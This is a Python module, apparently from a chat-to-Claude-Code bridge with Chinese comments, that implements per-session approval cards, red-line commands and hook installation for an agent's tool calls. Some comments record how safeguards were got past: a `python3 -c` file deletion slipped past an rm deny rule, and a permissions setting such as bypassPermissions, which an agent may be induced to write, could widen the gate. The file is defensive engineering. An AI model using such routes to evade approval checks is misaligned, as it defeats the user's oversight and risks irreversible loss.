        resolved = os.path.realpath(os.path.expanduser(raw))
        root = os.path.realpath(os.path.expanduser(_SESSION_SCRIPT_DIR))
    except OSError:
        return ""
    if os.path.dirname(resolved) != root:
        return ""
    if os.path.basename(resolved) not in _SESSION_SCRIPT_NAMES:
        return ""
    return resolved if os.path.isfile(resolved) else ""


def script_grant_name(script):
    return hashlib.sha256(script.encode()).hexdigest()[:24] + ".script"


# 同一个指纹的卡发出去多久之内不再发第二张。比审批令牌的 24 小时短得多：
# 超过这个窗口说明那一轮早过去了，宁可多发一张也不要让他等一张点不动的卡。
_ASKED_FRESH_SEC = 30 * 60
# 「刚批过」的提示窗口
_DONE_FRESH_SEC = 60 * 60


class ApprovalGate:
    """管理「待批准」目录。每个会话一个子目录，互不干扰。"""

    def __init__(self, root: str) -> None:
        self.root = root
        self.last_block_reason = ""  # 最近一次批准被红线拒绝的原因
        self.last_skipped_asked: list = []  # 上次 take_pending 跳过的「卡还挂着」的指纹
        os.makedirs(root, exist_ok=True)

    def dir_for(self, scope: str) -> str:
        # scope 里有冒号，拿来当目录名不安全 ⇒ 哈希掉
        safe = hashlib.sha256(scope.encode()).hexdigest()[:16]
        path = os.path.join(self.root, safe)
        os.makedirs(path, exist_ok=True)
        # 钩子要在这个目录里找 safe_prefixes.json 才知道哪些命令不用弹卡片。
        # 每个会话目录都要有一份（钩子只认 CARHER_APPROVAL_DIR 这一个目录）。
        if not os.path.exists(os.path.join(path, "safe_prefixes.json")):
            write_safe_prefixes(path)
        return path

    def _never_approvable_reason(self, directory: str, digest: str) -> str:
        """这一步是不是红线操作。从磁盘上的未决记录里取回原命令来判。"""
        from .cmdclass import never_approvable

        for suffix in (".asked", ".pending"):
            path = os.path.join(directory, digest + suffix)
            if not os.path.exists(path):
                continue
            try:
                with open(path, encoding="utf-8") as handle:
                    payload = json.load(handle)
            except (OSError, ValueError):
                continue
            command = str((payload.get("tool_input") or {}).get("command") or "")
            if command:
                return never_approvable(command)
        return ""

    def write_workspaces(self, scope: str, workspaces: tuple[str, ...]) -> None:
        """把 workspace 清单写给钩子。

        钩子是独立进程、读不到配置，只能靠文件。和 TRUSTED 开关同一套做法。
        缺这个文件时钩子不做路径判断（保守方向：别因为缺文件就把所有命令
        都变成要审批 —— 那比漏一层检查更快毁掉可用性）。
        """
        path = os.path.join(self.dir_for(scope), "workspaces.json")
        try:
            with open(path, "w", encoding="utf-8") as handle:
                json.dump(list(workspaces), handle, ensure_ascii=False)
        except OSError:
            logger.warning("写 workspace 清单失败：%s", path)

    def set_trusted(self, scope: str, trusted: bool) -> None:
        """全授权开关。钩子靠这个文件决定要不要弹卡片。

        每个会话目录一份 —— 和 `CARHER_APPROVAL_DIR` 一样按会话隔离，
        免得一个会话开了全授权影响别的。
        """
        path = os.path.join(self.dir_for(scope), "TRUSTED")
        try:
            if trusted:
                with open(path, "w") as handle:
                    handle.write(str(int(time.time())))
            elif os.path.exists(path):
                os.unlink(path)
        except OSError:
            logger.warning("写全授权标记失败：%s", path)

    def take_pending(self, scope: str) -> list[dict]:
        """取出这个会话所有待批准的操作。

        `.pending` 换成 `.asked`，**不是直接删掉** —— `approve()` 要靠它确认
        「这个操作确实是这一轮发过卡片、还在等点击的」。见 approve() 的红字。

        🔴 第 14 轮：**同一个指纹已经发过卡、还在等点击 ⇒ 不再返回它**（不再发第二张卡）。
        现场（2026-11-06 19:29 真实日志）：他一口气批了好几张 ⇒ 排了好几次「接着跑」⇒
        每次重跑都碰到同一条还没批的命令 ⇒ 钩子又落一条 `.pending` ⇒ 又发一张一样的卡。
        第一张批掉后 `.asked` 被删，第二张就批不动了，提示还叫他「重新发一次你的要求」。
        判据放在磁盘上（`.asked` 的时间），重启也在。超过 `_ASKED_FRESH_SEC` 的旧卡当过期，
        照旧重新发（不然那张卡的令牌也快到期了，他会永远等不到能点的东西）。
        跳过的指纹记在 `last_skipped_asked` 里给 app 那边用。
        """
        directory = self.dir_for(scope)
        found: list[dict] = []
        self.last_skipped_asked = []
        try:
            names = sorted(os.listdir(directory))
        except OSError:
            return found
        for name in names:
            if not name.endswith(".pending"):
                continue
            digest = name[: -len(".pending")]
            path = os.path.join(directory, name)
            asked = os.path.join(directory, digest + ".asked")
            try:
                asked_age = time.time() - os.path.getmtime(asked)
            except OSError:
                asked_age = None
            if asked_age is not None and asked_age <= _ASKED_FRESH_SEC:
                # 这一步的卡还挂在聊天里等他点 ⇒ 扔掉这条重复的待办，不再发卡
                try:
                    os.unlink(path)
                except OSError:
                    pass
                self.last_skipped_asked.append(digest)
                continue
            try:
                with open(path, encoding="utf-8") as handle:
                    payload = json.load(handle)
                payload["digest"] = digest
                found.append(payload)
                # 标记成「已发卡、等点击」。钩子只认 .ok，所以这不会放行任何东西。
                os.replace(path, os.path.join(directory, digest + ".asked"))
            except (OSError, json.JSONDecodeError):
                continue
        return found

    def approve(self, scope: str, digest: str) -> bool:
        """写下批准记录。钩子下次看到就放行。

        🔴 **只有正在等这次点击的操作才能被批准。**
        实测的泄漏（一轮 defer 两个操作 ⇒ 两张卡）：点卡片 1「不行」会 clear 掉
        整个会话、这一轮就结束了；再点卡片 2「同意」，原来照样写下 `.ok`，
        而没有任何会话在等着续跑 ⇒ 这个标记留在磁盘上，**下一轮甚至重启之后**
        同样的操作被钩子直接放行，没有卡片、没有点击、用户不知道。

        判据是磁盘上有没有这个操作的未决记录（`.pending` 还没发卡 / `.asked` 已发卡
        等点击），而不是内存里的 `_awaiting` —— 后者进程重启就没了，而 `.ok` 是落盘的，
        两者寿命必须对齐。`clear()` 会把两种记录一起删掉，所以拒绝/`/new` 之后
        任何「同意」都写不进来。
        """
        if not digest or "/" in digest or "." in digest:
            return False  # 防路径穿越
        directory = self.dir_for(scope)
        # 🔴 有些操作**连点同意都不放行**。
        # 实测：`python3 -c "import os; os.remove(…)"` 弹卡片 → 用户点同意 →
        # 文件真被删，而 `Bash(rm:*)` 的 deny 根本没触发（只认写出来的 rm）。
        # C 端产品里用户在手机上点错一下不该造成不可逆损失。
        blocked = self._never_approvable_reason(directory, digest)
        if blocked:
            logger.warning("拒绝批准（红线）：%s", blocked)
            # 记下原因给上层做提示 —— 用户点了同意却没反应是最糟的体验
            self.last_block_reason = blocked
            return False
        self.last_block_reason = ""
        outstanding = [
            os.path.join(directory, digest + suffix)
            for suffix in (".asked", ".pending")
            if os.path.exists(os.path.join(directory, digest + suffix))
        ]
        if not outstanding:
            return False  # 没有未决的这一步 / 这一轮已经结束 ⇒ 不许批准
        try:
            with open(os.path.join(directory, digest + ".ok"), "w") as handle:
                handle.write(str(int(time.time())))
        except OSError:
            return False
        # 🔴 只给提示文案用的标记：钩子只认 `.ok`，这个文件不放行任何东西。
        # 没有它的话，点第二张同指纹的卡会被回成「没存住你的批准，重新发一次你的要求」——
        # 而那一步其实已经批过、正在做（2026-11-06 19:29:59 现场）。
        try:
            with open(os.path.join(directory, digest + ".done"), "w") as handle:
                handle.write(str(int(time.time())))
        except OSError:
            pass
        self._grant_session_scripts(directory, outstanding)
        for path in outstanding:
            try:
                os.unlink(path)  # 一次点击只换一次放行
            except OSError:
                pass
        return True

    @staticmethod
    def _grant_session_scripts(directory: str, outstanding: list[str]) -> None:
        """批准的这条命令里用到了生图/生视频脚本 ⇒ 记下「本会话已认过这个脚本」。

        钩子之后在**同一个 claude 会话**里看到同一个脚本，就不再按越界拦
        （输出路径、档位照常判）。会话 id 取自钩子落下的未决记录：
        没有会话 id 就不记 —— 认不出是不是同一个会话，宁可再问一次。
        """
        payload: dict = {}
        for path in outstanding:
            try:
                with open(path, encoding="utf-8") as handle:
                    payload = json.load(handle)
                break
            except (OSError, ValueError):
                continue
        session_id = str(payload.get("session_id") or "")
        if payload.get("tool_name") != "Bash" or not session_id:
            return
        from .pathguard import _candidate_paths

        command = str((payload.get("tool_input") or {}).get("command") or "")
        for raw in _candidate_paths(command):
            script = session_script_path(raw)
            if not script:
                continue
            try:
                with open(os.path.join(directory, script_grant_name(script)), "w",
                          encoding="utf-8") as handle:
                    json.dump({"script": script, "session_id": session_id,
                               "at": time.time()}, handle)
                logger.info("本会话认下了脚本 %s（会话 %s）", os.path.basename(script),
                            session_id[:8])
            except OSError:
                logger.warning("记不下脚本批准，下次还会再问")

    def pending_session_id(self, scope: str, digest: str) -> str:
        """钩子落待办时记下的 claude session_id（批准后续跑 resume 它）。读不到 ⇒ 空串。"""
        if not digest or "/" in digest or "." in digest:
            return ""
        directory = self.dir_for(scope)
        for suffix in (".asked", ".pending"):
            try:
                with open(os.path.join(directory, digest + suffix), encoding="utf-8") as handle:
                    payload = json.load(handle)
            except (OSError, ValueError):
                continue
            if isinstance(payload, dict) and payload.get("session_id"):
                return str(payload["session_id"])
        return ""

    def approved_recently(self, scope: str, digest: str) -> bool:
        """这一步刚刚批过吗（只用于提示文案，不参与放行）。"""
        if not digest or "/" in digest or "." in digest:
            return False
        try:
            age = time.time() - os.path.getmtime(
                os.path.join(self.dir_for(scope), digest + ".done"))
        except OSError:
            return False
        return age <= _DONE_FRESH_SEC

    def first_unanswered(self, scope: str, order: list | tuple = ()) -> str:
        """这个会话里排第一的、还在等他点的卡（盘上 `.asked` / `.pending`）的指纹。没有返回空串。

        `order` 是出卡顺序（app 那边按令牌记的）；里面没有的（重启后内存丢了）按指纹排序兜底
        —— `take_pending` 也是按排序后的文件名出卡的。
        """
        try:
            names = os.listdir(self.dir_for(scope))
        except OSError:
            return ""
        open_ = {n.rsplit(".", 1)[0] for n in names if n.endswith((".asked", ".pending"))}
        for digest in order:
            if digest in open_:
                return digest
        return sorted(open_)[0] if open_ else ""

    def answer_with_reply(self, scope: str, digest: str, text: str) -> bool:
        """卡挂着时他打了一句话 ⇒ 作废这个会话所有待批项（同 `clear`），再把这句话记成
        `digest` 那张卡的回答（= 没批）。钩子下次碰到这一步就 deny 并带上原话。

        🔴 只会让这一步**更不**发生：钩子查到 `.deny` 一律 deny，从不 allow。
        原话**先脱敏再截断**才落盘（会进 claude 会话、可能被模型复述到聊天里）。
        记下钩子落待办时的 session_id：只在同一个 claude 会话里兑现。
        """
        if not digest or "/" in digest or "." in digest:
            self.clear(scope)
            return False
        session_id = self.pending_session_id(scope, digest)   # 要在 clear 之前读
        self.clear(scope)
        payload = {"text": _redact_then_cut(text, 500), "session_id": session_id,
                   "at": time.time()}
        try:
            with open(os.path.join(self.dir_for(scope), digest + ".deny"), "w",
                      encoding="utf-8") as handle:
                json.dump(payload, handle, ensure_ascii=False)
        except OSError:
            logger.warning("记不下他对确认卡的回话 digest=%s", digest[:8])
            return False
        return True

    def clear(self, scope: str) -> None:
        """放弃这个会话所有待批准项（/new 或拒绝时用）。"""
        directory = self.dir_for(scope)
        try:
            for name in os.listdir(directory):
                if name.endswith((".pending", ".asked", ".ok", ".script", ".done", ".deny")):
                    try:
                        os.unlink(os.path.join(directory, name))
                    except OSError:
                        pass
        except OSError:
            pass


# 从用户主配置继承的键。只要认证和模型，不要行为类配置。
#
# 刻意**不**继承：hooks（会和审批钩子打架）、permissions（桥自己用
# --allowed-tools 管，更严）、statusLine / outputStyle（桥没有 UI）。
_INHERIT_ENV_KEYS = (
    "ANTHROPIC_API_KEY",
    "ANTHROPIC_AUTH_TOKEN",
    "ANTHROPIC_BASE_URL",
    "ANTHROPIC_DEFAULT_HAIKU_MODEL",
    "ANTHROPIC_DEFAULT_SONNET_MODEL",
    "ANTHROPIC_DEFAULT_OPUS_MODEL",
    "ANTHROPIC_CUSTOM_HEADERS",
    "CLAUDE_CODE_ENABLE_GATEWAY_MODEL_DISCOVERY",
    "HTTP_PROXY",
    "HTTPS_PROXY",
    "NO_PROXY",
)

_INHERIT_TOP_KEYS = ("apiKeyHelper", "awsAuthRefresh", "model")


def write_safe_prefixes(directory: str) -> None:
    """把只读命令前缀导出给钩子。来源是 policy.READONLY_BASH，单一真相。"""
    from .policy import readonly_command_prefixes

    os.makedirs(directory, exist_ok=True)
    path = os.path.join(directory, "safe_prefixes.json")
    with open(path, "w", encoding="utf-8") as handle:
        json.dump(list(readonly_command_prefixes()), handle, ensure_ascii=False)


def user_settings_path() -> str:
    """用户自己的 claude 配置。注意**不能**用 CLAUDE_CONFIG_DIR —— 桥运行时
    那个变量已经被指向桥自己的目录了。
    """
    return os.path.expanduser("~/.claude/settings.json")


def inherited_auth(source: str = "") -> tuple[dict, dict]:
    """从用户的 settings.json 里**只挑**认证 / 模型那几个键 → (env 键, 顶层键)。

    清单就是上面两份（`_INHERIT_ENV_KEYS` / `_INHERIT_TOP_KEYS`），桥自己的配置目录和
    会话总控（`bridge/fleet/claude.py`）共用 —— 权限规则、hooks、MCP 一个都不带。
    读不到就两个空 dict。
    """
    source = source or user_settings_path()
    try:
        with open(source, encoding="utf-8") as handle:
            user = json.load(handle)
    except (OSError, ValueError):
        return {}, {}
    if not isinstance(user, dict):
        return {}, {}
    user_env = user.get("env")
    env = {}
    if isinstance(user_env, dict):
        env = {k: user_env[k] for k in _INHERIT_ENV_KEYS if k in user_env}
    top = {k: user[k] for k in _INHERIT_TOP_KEYS if k in user}
    return env, top


def _inherit_auth(settings: dict) -> None:
    """把用户的网关认证配置并进桥的 settings。桥自己已有的值优先，不覆盖。"""
    user_env, top = inherited_auth()
    if user_env:
        env = settings.setdefault("env", {})
        for key, value in user_env.items():
            env.setdefault(key, value)
    for key, value in top.items():
        settings.setdefault(key, value)


HOOK_MATCHER = "Bash|Write|Edit|NotebookEdit"


def hook_settings(hook_path: str) -> dict:
    """只含审批钩子的那段 settings。桥自己的 settings.json 和会话总控
    （`claude --settings '<json>'`）共用这一份，免得两边挂的工具对不上。"""
    return {
        "hooks": {
            "PreToolUse": [
                {
                    "matcher": HOOK_MATCHER,
                    # Windows 没有 /usr/bin/env，且路径几乎一定带空格 ⇒ 见 osenv.py
                    "hooks": [{"type": "command", "command": hook_command(hook_path)}],
                }
            ]
        }
    }


def install_hook(hook_path: str, settings_path: str, approval_dir: str = "") -> None:
    """把钩子脚本和 settings 写好。装机时跑一次。

    钩子挂在会真正改变东西的工具上：Bash / Write / Edit / NotebookEdit。
    Read/Glob/Grep 不挂 —— 只读操作不需要审批，挂了只会让每次查文件都卡一下。

    🔴 **刻意不把 `CARHER_APPROVAL_DIR` 写进 settings.json。**
    实测（2026-11-03）：settings.json 的 `env` **覆盖**进程传进去的环境变量 ——
    钩子看到的是 settings 里那个值，不是 `run_turn` 按会话传的那个。写进去的后果是
    所有会话共用一个批准目录，**A 会话批准的操作会让 B 会话的同样操作直接放行**。
    `approval_dir` 参数保留只为兼容调用方，不再写入。
    """
    os.makedirs(os.path.dirname(hook_path), exist_ok=True)
    with open(hook_path, "w", encoding="utf-8") as handle:
        handle.write(HOOK_SOURCE)
    os.chmod(hook_path, 0o755)

    # 把只读前缀清单写到每个会话的批准目录旁边，供钩子判「不用弹卡片」。
    # 不写进 settings.json 的 env —— 那里会覆盖进程环境（见下面红字）。
    if approval_dir:
        write_safe_prefixes(approval_dir)

    settings: dict = {}
    if os.path.exists(settings_path):
        try:
            with open(settings_path, encoding="utf-8") as handle:
                settings = json.load(handle)
        except (OSError, json.JSONDecodeError):
            settings = {}

    # 🔴 从用户自己的 ~/.claude/settings.json 继承网关配置。
    #
    # 2026-11-03 实测：桥用独立的 CLAUDE_CONFIG_DIR（为了不和用户手敲的 claude
    # 串会话），但那个目录里没有凭据 ⇒ claude 回 "Not logged in · Please run /login"，
    # 用户在飞书里只看到这句话，完全不知道为什么。
    #
    # 只继承**认证和模型相关**的键，不整份拷贝：用户的 hooks / permissions /
    # statusLine 之类不该被桥带进来（尤其 hooks，会和我们的审批钩子打架）。
    _inherit_auth(settings)

    hooks = settings.setdefault("hooks", {})
    hooks["PreToolUse"] = hook_settings(hook_path)["hooks"]["PreToolUse"]
    # 🔴 **每次装钩子都要清掉桥自己 settings.json 里的 permissions。**
    # 那个文件里一旦出现 `permissions.defaultMode: "bypassPermissions"`
    # 或 `allow: ["Bash"]`，整个只读闸门就被放宽了 —— 而闸门本该只由
    # `--allowed-tools` / `--disallowed-tools` 这些**启动参数**决定
    # （参数每次由 policy 现算，改不了）。
    # 写入途径不止一条：历史版本、用户手改、write 模式下被诱导的 agent。
    # 所以这里不管它怎么来的，一律清掉。
    if "permissions" in settings:
        logger.warning("清掉桥 settings.json 里的 permissions —— 闸门只认启动参数")
        settings.pop("permissions", None)
    # 用户自己的 hooks 也不能留在这里：只有审批钩子该挂在 PreToolUse 上，
    # 别的钩子（尤其 PostToolUse 里能跑任意命令的）会绕过审批层。
    hooks_existing = settings.get("hooks")
    if isinstance(hooks_existing, dict):
        for event in list(hooks_existing):
            if event != "PreToolUse":
                logger.warning("清掉桥 settings.json 里的 hooks.%s", event)
                hooks_existing.pop(event, None)

    # 见上面的红字：绝不在这里写 CARHER_APPROVAL_DIR。
    # 若历史版本写过，这里顺手清掉，否则会一直盖掉按会话传的值。
    env = settings.get("env")
    if isinstance(env, dict):
        env.pop("CARHER_APPROVAL_DIR", None)
        if not env:
            settings.pop("env", None)

    os.makedirs(os.path.dirname(settings_path), exist_ok=True)
    with open(settings_path, "w", encoding="utf-8") as handle:
        json.dump(settings, handle, ensure_ascii=False, indent=2)


def _redact_then_cut(text: str, limit: int) -> str:
    """🔴 **先脱敏整段、再截断**，截断处明说。

    2026-11-05 体验审查：原来先截 500 字再交给卡片脱敏 —— 密钥正好跨在第 500 字上时，
    前半截已经不是完整的密钥形状，规则匹配不上，露出一截；截断处也没有标记，
    用户以为看到的就是整条命令（同 cards.py 的红字，那边早修了，这里漏了）。
    """
    from .redact import redact

    clean, _ = redact(str(text or ""))
    if len(clean) <= limit:
        return clean
    return clean[:limit] + f"\n…（还有 {len(clean) - limit} 个字没显示）"


def describe_action(tool_name: str, tool_input: dict) -> str:
    """把一次工具调用说成人话，放进飞书卡片。"""
    if tool_name == "Bash":
        command = str(tool_input.get("command") or "")
        return f"跑这条命令：\n{_redact_then_cut(command, 500)}"
    if tool_name in {"Write", "Edit", "NotebookEdit"}:
        path = str(tool_input.get("file_path") or "?")
        verb = "新建/覆盖" if tool_name == "Write" else "修改"
        return f"{verb}文件：{_redact_then_cut(path, 300)}"
    return f"{tool_name}：{_redact_then_cut(json.dumps(tool_input, ensure_ascii=False), 300)}"
